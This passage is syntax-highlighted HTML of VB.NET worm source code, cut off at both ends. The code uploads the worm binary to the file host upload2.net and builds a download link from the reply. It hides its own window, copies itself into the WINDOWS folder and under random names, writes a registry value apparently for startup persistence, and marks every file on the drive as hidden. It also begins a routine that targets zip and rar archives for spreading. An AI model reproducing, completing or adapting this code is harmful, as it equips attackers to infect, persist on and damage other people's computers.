        </span><span class="sc7">Constants.vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Constants.vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"27000000"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Constants.vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc4">"--"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">boundary</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Constants.vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc4">"Content-Disposition: form-data; name=""page"""</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc7">Constants.vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Constants.vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"upload"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Constants.vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc4">"--"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">boundary</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Constants.vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc4">"Content-Disposition: form-data; name=""file""; filename="""</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc7">Worm</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">""""</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Constants.vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Content-Type: application/x-msdos-program"</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Constants.vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Constants.vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Encoding.Default.GetString</span><span class="sc6">(</span><span class="sc7">bytes</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc7">Constants.vbCrLf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"--"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">boundary</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"--"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Constants.vbCrLf</span><span class="sc0">

        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">buffer</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Encoding.Default.GetBytes</span><span class="sc6">(</span><span class="sc7">mimebody</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">request</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">HttpWebRequest</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">CType</span><span class="sc6">(</span><span class="sc7">WebRequest.Create</span><span class="sc6">(</span><span class="sc4">"http://www5.upload2.net/upload.php"</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">HttpWebRequest</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc7">request.Method</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"POST"</span><span class="sc0">
        </span><span class="sc7">request.ContentType</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"multipart/form-data; charset=UTF-8; boundary="</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">boundary</span><span class="sc0">
        </span><span class="sc7">request.Accept</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"text/xml,application/xml,application/xhtml+xml, "</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
         </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc4">"text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"</span><span class="sc0">
        </span><span class="sc7">request.Headers.Add</span><span class="sc6">(</span><span class="sc4">"Accept-Encoding"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"gzip,deflate"</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc7">request.Headers.Add</span><span class="sc6">(</span><span class="sc4">"Accept-Charset"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ISO-8859-1,utf-8;q=0.7,*;q=0.7"</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc7">request.ContentLength</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">buffer.Length</span><span class="sc0">
        </span><span class="sc7">ServicePointManager.Expect100Continue</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
        </span><span class="sc7">request.CookieContainer</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">New</span><span class="sc0"> </span><span class="sc7">CookieContainer</span><span class="sc6">()</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">srvStream</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Stream</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">request.GetRequestStream</span><span class="sc6">()</span><span class="sc0">
        </span><span class="sc7">srvStream.Write</span><span class="sc6">(</span><span class="sc7">buffer</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">buffer.Length</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc7">srvStream.Close</span><span class="sc6">()</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">response</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">HttpWebResponse</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">CType</span><span class="sc6">(</span><span class="sc7">request.GetResponse</span><span class="sc6">(),</span><span class="sc0"> </span><span class="sc7">HttpWebResponse</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">respURL</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">response.ResponseUri.ToString</span><span class="sc6">()</span><span class="sc0">

        </span><span class="sc1">'I love playing with strings!
</span><span class="sc0">        </span><span class="sc7">pos</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">respURL.IndexOf</span><span class="sc6">(</span><span class="sc4">"/id/"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc7">sKey</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">respURL</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">pos</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">respURL</span><span class="sc6">))</span><span class="sc0">
        </span><span class="sc7">pos2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">sKey.IndexOf</span><span class="sc6">(</span><span class="sc4">"/pwd/"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc7">key</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">sKey.Substring</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">pos2</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc7">url</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"http://www.upload2.net/page/download/"</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">key</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc4">"/"</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc7">Worm</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc4">".html"</span><span class="sc0">

    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

    </span><span class="sc1">''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">    </span><span class="sc1">'Worm needs to know the current drive its on so this deals with it.    '
</span><span class="sc0">    </span><span class="sc1">''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">    </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">CurDrive</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">arg</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">dir</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Pos</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
        </span><span class="sc7">Pos</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">arg.IndexOf</span><span class="sc6">(</span><span class="sc4">"\"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc7">dir</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">arg.Substring</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Val</span><span class="sc6">(</span><span class="sc7">Pos</span><span class="sc6">))</span><span class="sc0">
        </span><span class="sc7">CurDrive</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">dir</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

    </span><span class="sc1">'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">    </span><span class="sc1">'payload that calls on other functions to get what it needs.      '
</span><span class="sc0">    </span><span class="sc1">'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">    </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">payload</span><span class="sc6">()</span><span class="sc0">
        </span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">MyDir</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">DirectoryInfo</span><span class="sc0">
        </span><span class="sc7">MyDir</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">New</span><span class="sc0"> </span><span class="sc7">DirectoryInfo</span><span class="sc6">(</span><span class="sc7">WormPath</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc7">GetDirs</span><span class="sc6">(</span><span class="sc7">MyDir</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

    </span><span class="sc1">'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">    </span><span class="sc1">'this kinda just installs the worm.. explains itself (like most of my code) '
</span><span class="sc0">    </span><span class="sc1">'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">    </span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Form1_Load</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">sender</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">System.Object</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">e</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">System.EventArgs</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Handles</span><span class="sc0"> </span><span class="sc7">MyBase.Load</span><span class="sc0">
        </span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
        </span><span class="sc7">Me.Visible</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">WormModule</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">System.Reflection.Module</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">[Assembly]</span><span class="sc6">.</span><span class="sc7">GetExecutingAssembly</span><span class="sc6">().</span><span class="sc7">GetModules</span><span class="sc6">()(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc7">WormFile</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">WormModule.FullyQualifiedName</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc7">WormPath</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">CurDrive</span><span class="sc6">(</span><span class="sc7">WormFile</span><span class="sc6">))</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">NewValue</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">WormPath</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\WINDOWS\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">KeyTitle</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".exe"</span><span class="sc0">
        </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">File.Exists</span><span class="sc6">(</span><span class="sc7">NewValue</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
            </span><span class="sc7">File.Copy</span><span class="sc6">(</span><span class="sc7">WormFile</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">NewValue</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
        </span><span class="sc7">Worm</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">RndFileName</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".exe"</span><span class="sc0">
        </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">File.Exists</span><span class="sc6">(</span><span class="sc7">Worm</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
            </span><span class="sc7">File.Copy</span><span class="sc6">(</span><span class="sc7">WormFile</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Worm</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">key</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">RegistryKey</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Registry.CurrentUser.OpenSubKey</span><span class="sc6">(</span><span class="sc7">subkey</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc7">key.SetValue</span><span class="sc6">(</span><span class="sc7">KeyTitle</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">NewValue</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

    </span><span class="sc1">'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">    </span><span class="sc1">'this is part of a recursive folder searching function            '
</span><span class="sc0">    </span><span class="sc1">'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">    </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">GetDirs</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">aDir</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">DirectoryInfo</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">nextDir</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">DirectoryInfo</span><span class="sc0">
        </span><span class="sc7">GetFiles</span><span class="sc6">(</span><span class="sc7">aDir</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">nextDir</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">aDir.GetDirectories</span><span class="sc0">
            </span><span class="sc7">GetDirs</span><span class="sc6">(</span><span class="sc7">nextDir</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">Next</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
    </span><span class="sc1">'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">    </span><span class="sc1">'same as above but for files.. they reply on eachother to work..  '
</span><span class="sc0">    </span><span class="sc1">'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">    </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">GetFiles</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">aDir</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">DirectoryInfo</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">aFile</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">FileInfo</span><span class="sc0">
        </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">aFile</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">aDir.GetFiles</span><span class="sc6">()</span><span class="sc0">
            </span><span class="sc7">File.SetAttributes</span><span class="sc6">(</span><span class="sc7">aFile.FullName</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">FileAttributes.Hidden</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">Next</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
    </span><span class="sc1">'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">    </span><span class="sc1">'well i decided its better not to use a static name for uploading '
</span><span class="sc0">    </span><span class="sc1">'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">    </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">RndFileName</span><span class="sc6">()</span><span class="sc0">
        </span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">builder</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">New</span><span class="sc0"> </span><span class="sc7">StringBuilder</span><span class="sc6">()</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">random</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">New</span><span class="sc0"> </span><span class="sc7">Random</span><span class="sc6">()</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">cha</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Char</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
        </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
            </span><span class="sc7">cha</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Convert.ToChar</span><span class="sc6">(</span><span class="sc7">Convert.ToInt32</span><span class="sc6">((</span><span class="sc2">26</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc7">random.NextDouble</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">65</span><span class="sc6">)))</span><span class="sc0">
            </span><span class="sc7">builder.Append</span><span class="sc6">(</span><span class="sc7">cha</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">Next</span><span class="sc0">
        </span><span class="sc7">RndFileName</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">builder.ToString</span><span class="sc6">()</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
    </span><span class="sc1">''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">    </span><span class="sc1">'this sub is for zip/rar archive worm  '
</span><span class="sc0">    </span><span class="sc1">''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">    </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">RarWorm</span><span class="sc6">()</span><span class="sc0">
        </span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">WormModule</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">System.Reflection.Module</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">[Assembly]</span><span class="sc6">.</span><span class="sc7">GetExecutingAssembly</span><span class="sc6">().</span><span class="sc7">GetModules</span><span class="sc6">()(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">WormFile</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">WormModule.Name</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">FullName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">WormModule.FullyQualifiedName</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">WormPath</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">WorkingFolder</span><span class="sc6">(</span><span class="sc7">FullName</span><span class="sc6">))</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Int32</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">files</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">compile</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">ShrtPath</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">shrtWorm</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">ext</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
        </span><span class="sc7">files</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">System.IO.Directory.GetFiles</span><span class="sc6">(</span><span class="sc7">WormPath</span><span class="sc6">)</span><span class="sc0">

        </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">files.GetUpperBound</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
            </span><span class="sc7">ext</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">files</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">files</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">files</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">)))</span><span class="sc0">
            </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">ext</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">".rar"</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc7">ext</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">".zip"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
